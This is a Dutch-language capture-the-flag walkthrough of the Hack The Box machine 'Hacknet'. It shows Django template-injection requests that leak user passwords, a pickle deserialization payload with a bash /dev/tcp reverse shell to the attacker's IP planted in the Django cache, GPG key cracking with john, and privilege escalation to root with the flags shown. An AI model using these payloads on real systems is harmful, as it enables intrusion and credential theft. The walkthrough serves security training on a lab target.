# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ nmap -sCV 10.129.115.13           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 20:31 CEST
Nmap scan report for 10.129.115.13
Host is up (0.026s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://hacknet.htb/
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.43 seconds

```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ nmap -sCV 10.129.115.13           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 20:31 CEST
Nmap scan report for 10.129.115.13
Host is up (0.026s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://hacknet.htb/
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ik heb de FQDN toegevoeged aan de hosts file en daarna ben ik naar de webpagina geweest. Daar heb je een button dat je kunt sign uppen. Zoals je hieronder zult kunnen zien ben ik dit gaan doen met de user test.

![[Pasted image 20250922203450.png]]

Eens dat ik mijn account heb geregistreerd ben ik deze gaan inloggen door gebruik te maken van mijn mail address en mijn password. Zoals je hieronder zult kunnen zien zijn we ingelogged als de user test.

![[Pasted image 20250922203703.png]]

### Information Exposure
Volgens mij zullen het de explore en de search button zijn waar we de antwoorden zullen kunnen vinden voor binnen te geraken op de systemen. Door aan de hand van POST van de gebruikers te gaan liken, zullen we een Post commando kunnen gaan uitvoeren voor het achterhalen van alle usernames.

```
┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ curl -X POST http://hacknet.htb/likes/15 \
  -H "User-Agent: Mozilla/5.0" \
  -H "Cookie: csrftoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO; sessionid=m1v5xxgjp8e0bfiuakl39lnebzyd4sqm" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "action=delete&userId=27&csrfmiddlewaretoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO"
<div class="likes-review-item"><a href="/profile/2"><img src="/media/2.jpg" title="hexhunter"></a></div><div class="likes-review-item"><a href="/profile/3"><img src="/media/3.jpg" title="rootbreaker"></a></div><div class="likes-review-item"><a href="/profile/4"><img src="/media/4.jpg" title="zero_day"></a></div><div class="likes-review-item"><a href="/profile/6"><img src="/media/6.jpg" title="shadowcaster"></a></div><div class="likes-review-item"><a href="/profile/7"><img src="/media/7.png" title="blackhat_wolf"></a></div><div class="likes-review-item"><a href="/profile/8"><img src="/media/8.png" title="bytebandit"></a></div><div class="likes-review-item"><a href="/profile/9"><img src="/media/9.png" title="glitch"></a></div><div class="likes-review-item"><a href="/profile/11"><img src="/media/11.png" title="phreaker"></a></div><div class="likes-review-item"><a href="/profile/12"><img src="/media/12.png" title="codebreaker"></a></div><div class="likes-review-item"><a href="/profile/13"><img src="/media/13.png" title="netninja"></a></div><div class="likes-review-item"><a href="/profile/14"><img src="/media/14.png" title="packetpirate"></a></div><div class="likes-review-item"><a href="/profile/15"><img src="/media/15.png" title="darkseeker"></a></div><div class="likes-review-item"><a href="/profile/17"><img src="/media/17.jpg" title="trojanhorse"></a></div><div class="likes-review-item"><a href="/profile/19"><img src="/media/19.jpg" title="exploit_wizard"></a></div><div class="likes-review-item"><a href="/profile/21"><img src="/media/21.jpg" title="whitehat"></a></div><div class="likes-review-item"><a href="/profile/22"><img src="/media/22.png" title="deepdive"></a></div><div class="likes-review-item"><a href="/profile/23"><img src="/media/23.jpg" title="virus_viper"></a></div><div class="likes-review-item"><a href="/profile/24"><img src="/media/24.jpg" title="brute_force"></a></div><div class="likes-review-item"><a href="/profile/25"><img src="/media/25.jpg" title="shadowwalker"></a></div>
```

We zullen nu als eerst de username gaan veranderen naar {{users}}. Door je gebruikersnaam te veranderen naar {{ users }}, zorg je ervoor dat deze als template code wordt geïnterpreteerd door de server (SSTI = Server Side Template Injection). Hierdoor kan je de lijst van gebruikers in de template “injecteren” en zichtbaar maken. Ik ben de username gaan veranderen door gebruik te maken van de terminal en het onderstaande POST commando. Maar je kan dit ook gewoon doen door naar de volgende url te gaan http://hacknet.htb/profile/edit. 

```
┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ curl -X POST "http://hacknet.htb/profile/edit" \
  -H "Cookie: csrftoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO; sessionid=m1v5xxgjp8e0bfiuakl39lnebzyd4sqm" \
  -H "Origin: http://hacknet.htb" \
  -H "Referer: http://hacknet.htb/profile/edit" \
  -F "csrfmiddlewaretoken=5U1p123JolSWKMMZVpm7y0yScEeuHrttY3btuFJk64WWtDylzOmH2XYPdVOI7S97" \
  -F "picture=" \ 
  -F "email=" \
  -F "username={{users}}" \
  -F "password=" \
  -F "about=" \
  -F "is_public=on"

<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="/static/style.css">
    <script src="/static/jquery-3.7.1.min.js"></script>
    <script src="/static/script.js"></script>
    <title>HackNet - Profile edit</title>
    <link rel="icon" type="image/png" href="/static/icon.png">
</head>
<body>
    <div class="jp-title"><div class="scrollingtext">Cybersecurity Firm Hires Cat, Discovers It’s a Natural at Catching Bugs. Fluffy the feline becomes the company’s top debugger, proving purr-vasive in system security.</div></div>
    <div id="container">
        <nav><a href="/profile">Profile</a>
<a href="/contacts">Contacts</a>
<a href="/messages">Messages</a>
<a href="/search">Search</a>
<a href="/explore">Explore</a>
<a href="/logout">Log out</a></nav>
        <div id="content">
<div id="profile">
    <div id="profile-picture">
        <img src="/media/profile.png">
    </div>
    <form id="profile-info" action="edit" method="POST" enctype="multipart/form-data">
        <input type="hidden" name="csrfmiddlewaretoken" value="WJJAqq74cdd7cNysQMtaiGCdU5i31UAXPSTET3NFUWh7VEkOubtKMD2aVmShrlgB">
        <input type="file" name="picture" accept="image/png, image/jpeg">
        <input type="email" name="email" placeholder="test@hacknet.htb">
        <input name="username" placeholder="{{users}}">
        <input type="password" name="password" placeholder="***********">
        <textarea name="about" rows="4"></textarea>
        <div><input type="checkbox" name="is_public" checked> Public</div>
        <div><input type="checkbox" name="two_fa" > 2FA</div>
        <button type="submit">Save</button>
    </form>
    <div id="profile-right-emp"></div>
</div>

<h2 id="m_er">Profile updated</h2>

</div>
    </div>
</body>
</html>
```

Nu kan je de post gaan gebruiken die je daarvoor al had geliked. Deze zullen we gaan gebruiken voor de mails en passworden te gaan tonen van de user die post geliked heeft. Dit kan je gaan doen door nu je user te gaan veranderen naar {{users.{index}.email}} en door {{users.{index}.password}} te gaan gebruiken zodat de server (door de SSTI-kwetsbaarheid) die expressie verwerkt en in plaats van gewoon {{ users.0.email }}, het daadwerkelijke e-mailadres van de eerste gebruiker (index 0) laat zien. Alleen zal je nu dus in de url van het POST commando de url naar de likes zetten.

```
┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ curl -X POST "http://hacknet.htb/likes/15" \
  -H "Cookie: csrftoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO; sessionid=m1v5xxgjp8e0bfiuakl39lnebzyd4sqm" \
  -H "Origin: http://hacknet.htb" \
  -H "Referer: http://hacknet.htb/profile/edit" \
  -F "csrfmiddlewaretoken=5U1p123JolSWKMMZVpm7y0yScEeuHrttY3btuFJk64WWtDylzOmH2XYPdVOI7S97" \
  -F "picture=" \
  -F "email=" \
  -F "username={{users.15.email}}" \
  -F "password=" \
  -F "about=" \
  -F "is_public=on"
<div class="likes-review-item"><a href="/profile/2"><img src="/media/2.jpg" title="hexhunter"></a></div><div class="likes-review-item"><a href="/profile/3"><img src="/media/3.jpg" title="rootbreaker"></a></div><div class="likes-review-item"><a href="/profile/4"><img src="/media/4.jpg" title="zero_day"></a></div><div class="likes-review-item"><a href="/profile/6"><img src="/media/6.jpg" title="shadowcaster"></a></div><div class="likes-review-item"><a href="/profile/7"><img src="/media/7.png" title="blackhat_wolf"></a></div><div class="likes-review-item"><a href="/profile/8"><img src="/media/8.png" title="bytebandit"></a></div><div class="likes-review-item"><a href="/profile/9"><img src="/media/9.png" title="glitch"></a></div><div class="likes-review-item"><a href="/profile/11"><img src="/media/11.png" title="phreaker"></a></div><div class="likes-review-item"><a href="/profile/12"><img src="/media/12.png" title="codebreaker"></a></div><div class="likes-review-item"><a href="/profile/13"><img src="/media/13.png" title="netninja"></a></div><div class="likes-review-item"><a href="/profile/14"><img src="/media/14.png" title="packetpirate"></a></div><div class="likes-review-item"><a href="/profile/15"><img src="/media/15.png" title="darkseeker"></a></div><div class="likes-review-item"><a href="/profile/17"><img src="/media/17.jpg" title="trojanhorse"></a></div><div class="likes-review-item"><a href="/profile/19"><img src="/media/19.jpg" title="exploit_wizard"></a></div><div class="likes-review-item"><a href="/profile/21"><img src="/media/21.jpg" title="whitehat"></a></div><div class="likes-review-item"><a href="/profile/22"><img src="/media/22.png" title="deepdive"></a></div><div class="likes-review-item"><a href="/profile/23"><img src="/media/23.jpg" title="virus_viper"></a></div><div class="likes-review-item"><a href="/profile/24"><img src="/media/24.jpg" title="brute_force"></a></div><div class="likes-review-item"><a href="/profile/25"><img src="/media/25.jpg" title="shadowwalker"></a></div><div class="likes-review-item"><a href="/profile/27"><img src="/media/profile.png" title="deepdive@hacknet.htb"></a></div>
```

Ik ben dit gaan doen voor de user deepdive en hieronder kan je de usercredentials vinden van de user.

| Username             | Password  |
| -------------------- | --------- |
| deepdive@hacknet.htb | D33pD!v3r |
Nu dat we de inloggevens van de user deepdive hebben, ben ik gaan kijken naar de contacts en daar heb ik gezien dat de user deepdive als contact backdoor_bandit heeft. We zullen dit nu gaan proberen doen voor de user backdoor_bandit user. Hieronder kan je zien dat de user backdoor_bandit de post van deepdive geliked heeft.

![[Pasted image 20251119194527.png]]

Nu dat we de inloggegevens van de deepdive user hadden, ben ik met mijn aangemaakte user een contact verzoek gaan verzenden. Je zal deze met de deepdive user moeten accepteren en zal je daarna de post kunnen zien van de deepdive user. Onder deze post heeft de backdoor_bandit user ook geliked. Dus zal je nu hetzelfde kunnen gaan doen dan voor de deepdive user. Hierbij ben ik dus op de volgende code gekomen en heb ik dus het username en password voor de ssh connectie gaan verkrijgen. Voor als je de verschillende data wilt verkrijgen zal je wel steeds de username van de testuser gaan moeten veranderen naar de 2 volgende zaken. Voor de juiste data te verkrijgen zal je de juiste geliked post moeten gebruiken.

# Change username Test user for username retrievement

```
┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ curl -X POST "http://hacknet.htb/profile/edit" \
  -H "Cookie: csrftoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO; sessionid=qnek8cbewxe2yozxsrcscs1tmny7wd5b" \
  -H "Origin: http://hacknet.htb" \
  -H "Referer: http://hacknet.htb/profile/edit" \
  -F "csrfmiddlewaretoken=Z8tMuB1CklHUyHjXtpGyCSeUnr1BMgR9ShDQXeHd24LUhy5j7OG86PERoIBPcHxN" \
  -F "picture=" \
  -F "email=" \
  -F "username={{users.0.email}}" \   
  -F "password=" \
  -F "about=" \
  -F "is_public=on"

┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ curl -X POST "http://hacknet.htb/likes/23" \    
  -H "Cookie: csrftoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO; sessionid=qnek8cbewxe2yozxsrcscs1tmny7wd5b" \
  -H "Origin: http://hacknet.htb" \      
  -H "Referer: http://hacknet.htb/profile/edit" \
  -F "csrfmiddlewaretoken=0eqMP1yUvG4lrXdPb19Rl473DBWUFGTVTnAQiEevdp8laOZbPq9rP1x0ESw857zz" \
  -F "picture=" \
  -F "email=" \  
  -F "username={{users.0.email}}" \  
  -F "password=" \
  -F "about=" \
  -F "is_public=on"  
<div class="likes-review-item"><a href="/profile/18"><img src="/media/18.jpg" title="backdoor_bandit"></a></div><div class="likes-review-item"><a href="/profile/22"><img src="/media/22.png" title="deepdive"></a></div><div class="likes-review-item"><a href="/profile/27"><img src="/media/profile.png" title="mikey@hacknet.htb">
```
# Change username Test user for password retrievement

```
┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ curl -X POST "http://hacknet.htb/profile/edit" \
  -H "Cookie: csrftoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO; sessionid=qnek8cbewxe2yozxsrcscs1tmny7wd5b" \
  -H "Origin: http://hacknet.htb" \
  -H "Referer: http://hacknet.htb/profile/edit" \
  -F "csrfmiddlewaretoken=Z8tMuB1CklHUyHjXtpGyCSeUnr1BMgR9ShDQXeHd24LUhy5j7OG86PERoIBPcHxN" \
  -F "picture=" \
  -F "email=" \
  -F "username={{users.0.password}}" \
  -F "password=" \
  -F "about=" \
  -F "is_public=on"

┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ curl -X POST "http://hacknet.htb/likes/23" \    
  -H "Cookie: csrftoken=3jkeDNQLSTeaT1WwOzaKE7A7brKoABQO; sessionid=qnek8cbewxe2yozxsrcscs1tmny7wd5b" \
  -H "Origin: http://hacknet.htb" \
  -H "Referer: http://hacknet.htb/profile/edit" \
  -F "csrfmiddlewaretoken=Jtvnaqs7KI6jlip0Cah6uUqclUKAAi8kCCFrD38Israj49bmgzhGYRQ9mbkO0JOY" \
  -F "picture=" \
  -F "email=" \  
  -F "username={{users.0.password}}" \
  -F "password=" \
  -F "about=" \
  -F "is_public=on"
<div class="likes-review-item"><a href="/profile/18"><img src="/media/18.jpg" title="backdoor_bandit"></a></div><div class="likes-review-item"><a href="/profile/22"><img src="/media/22.png" title="deepdive"></a></div><div class="likes-review-item"><a href="/profile/27"><img src="/media/profile.png" title="**mYd4rks1dEisH3re**"></a></div>  
```

| Username | Password         |
| -------- | ---------------- |
| Mikey    | mYd4rks1dEisH3re |
# SSH to Mikey

Door de username en password van hierboven te gebruiken kunnen we een ssh connectie met de server opzetten. En heb ik de user flag dus gevonden.

```
┌──(kali㉿kali)-[~]
└─$ ssh mikey@hacknet.htb    
mikey@hacknet.htb's password: 
Linux hacknet 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Nov 19 14:14:44 2025 from 10.10.16.11
mikey@hacknet:~$ ls
user.txt
mikey@hacknet:~$ cat user.txt 
4c00f758c3a0d8205e7e9acd1eb2d86c
mikey@hacknet:~$ 
```

Eerst ben ik dus nu gaan kijken of dat we het sudo -l commando konden gebruiken maar dit was zonder success. Ik ben hiervoor dus nu linpeas gaan runnen op de machine.

Binnen linpeas ben ik op de interessante output gekomen dat er een localhost op poort 3306 kan gedraaid worden en dat er een hacknet folder bestaat van de andere gebruiker sandy. Binnen de `/var/www/HackNet` directory ben ik gaan zoeken naar de naam sandy en daar ben ik op de settings.py file gekomen. Hierin stond de volgende interessante informatie.

```
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'hacknet',
        'USER': 'sandy',
        'PASSWORD': 'h@ckn3tDBpa$$',
        'HOST':'localhost',
        'PORT':'3306',
    }
}
```

Voor sandy te worden zullen we een base 64 shell moeten maken zodat we deze aan de django cache file kunnen toevoegen.

```
┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ cat a.py  
import pickle
import base64

# Exploit object
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ("bash -c 'exec bash -i &>/dev/tcp/10.10.16.11/4444 <&1'|bash",),)


payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload)
```

```
mikey@hacknet:/var/tmp/django_cache$ ls -la
total 16
drwxrwxrwx 2 sandy www-data 4096 Nov 19 16:05 .
drwxrwxrwt 4 root  root     4096 Nov 19 13:11 ..
-rw------- 1 sandy www-data   34 Nov 19 16:05 1f0acfe7480a469402f1852f8313db86.djcache
-rw------- 1 sandy www-data 3156 Nov 19 16:05 90dbab8f3b1e54369abdeb4ba1efc106.djcache
mikey@hacknet:/var/tmp/django_cache$ for i in $(ls); do rm -f $i;  echo 'gASVVgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDtiYXNoIC1jICdleGVjIGJhc2ggLWkgJj4vZGV2L3RjcC8xMC4xMC4xNi4xMS80NDQ0IDwmMSd8YmFzaJSFlFKULg==' |base64 -d> $i; chmod 777 $i; done
```
voor dat je de connectie met de server krijgt moet je eerst op de explorer en de search refreshen.
Listener
```
┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.232.4 48482
bash: cannot set terminal process group (1713): Inappropriate ioctl for device
bash: no job control in this shell
sandy@hacknet:/var/www/HackNet$ 
```

```
sandy@hacknet:~/.gnupg$ ls -la
ls -la
total 32
drwx------ 4 sandy sandy 4096 Sep  5 11:33 .
drwx------ 6 sandy sandy 4096 Sep 11 11:18 ..
drwx------ 2 sandy sandy 4096 Sep  5 11:33 openpgp-revocs.d
drwx------ 2 sandy sandy 4096 Sep  5 11:33 private-keys-v1.d
-rw-r--r-- 1 sandy sandy  948 Sep  5 11:33 pubring.kbx
-rw------- 1 sandy sandy   32 Sep  5 11:33 pubring.kbx~
-rw------- 1 sandy sandy  600 Sep  5 11:33 random_seed
-rw------- 1 sandy sandy 1280 Sep  5 11:33 trustdb.gpg
sandy@hacknet:~/.gnupg$ cd pri
cd private-keys-v1.d/
sandy@hacknet:~/.gnupg/private-keys-v1.d$ ls -la
ls -la
total 20
drwx------ 2 sandy sandy 4096 Sep  5 11:33 .
drwx------ 4 sandy sandy 4096 Sep  5 11:33 ..
-rw------- 1 sandy sandy 1255 Sep  5 11:33 0646B1CF582AC499934D8503DCF066A6DCE4DFA9.key
-rw------- 1 sandy sandy 2088 Sep  5 11:33 armored_key.asc
-rw------- 1 sandy sandy 1255 Sep  5 11:33 EF995B85C8B33B9FC53695B9A3B597B325562F4F.key
sandy@hacknet:~/.gnupg/private-keys-v1.d$ 
```

private armored key file naar je eigen machine nemen password cracken door john te gebruiken.

```
┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ wget http://10.129.232.4:8000/armored_key.asc                                  //
armored_key.asc              100%[=============================================>]   2.04K  --.-KB/s    in 0.01s   

2025-11-20 01:59:49 (150 KB/s) - ‘armored_key.asc’ saved [2088/2088]

┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ gpg2john armored_key.asc > hash.txt

┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
//
sweetheart       (Sandy)     
//
```

```
┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ gpg --import armored_key.asc

gpg: key D72E5C1FA19C12F7: public key "Sandy (My key for backups) <sandy@hacknet.htb>" imported
gpg: key D72E5C1FA19C12F7: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

```

```      
┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ gpg --decrypt backup01.sql.gpg > backup01.sql
gpg: encrypted with rsa1024 key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"

┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ gpg --decrypt backup02.sql.gpg > backup02.sql
gpg: encrypted with rsa1024 key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ gpg --decrypt backup03.sql.gpg > backup03.sql
gpg: encrypted with rsa1024 key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"

```

```
┌──(kali㉿kali)-[~/HTB/Hacknet]
└─$ cat backup02.sql | grep password
(26,'Brute force attacks may be noisy, but they’re still effective. I’ve been refining my techniques to make them more efficient, reducing the time it takes to crack even the most complex passwords. Writing up a guide on how to optimize your brute force attacks.','2024-08-30 14:19:57.000000',6,2,0,24);
(11,'Reducing the time to crack complex passwords is no small feat. Even though brute force is noisy, it’s still one of the most reliable methods out there. Your guide will be a must-read for anyone looking to sharpen their skills in this area!','2024-09-02 09:04:13.000000',26,7);
(47,'2024-12-29 20:29:36.987384','Hey, can you share the MySQL root password with me? I need to make some changes to the database.',1,22,18),
(48,'2024-12-29 20:29:55.938483','The root password? What kind of changes are you planning?',1,18,22),
(50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here’s the password: **h4ck3rs4re3veRywh3re99**. Let me know when you’re done.',1,18,22),
  `password` varchar(70) NOT NULL,
(24,'brute_force@ciphermail.com','brute_force','BrUt3F0rc3#','24.jpg','Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.',0,0,1,0,0),
  `password` varchar(128) NOT NULL,

```

| username | password               |
| -------- | ---------------------- |
| root     | h4ck3rs4re3veRywh3re99 |

```
mikey@hacknet:~$ su root
Password: 
root@hacknet:/home/mikey# cat /root/root.txt 
5e413a4c1dc293afc6cb7644b18dd2e8
root@hacknet:/home/mikey# 
```

![[Pasted image 20251119224917.png]]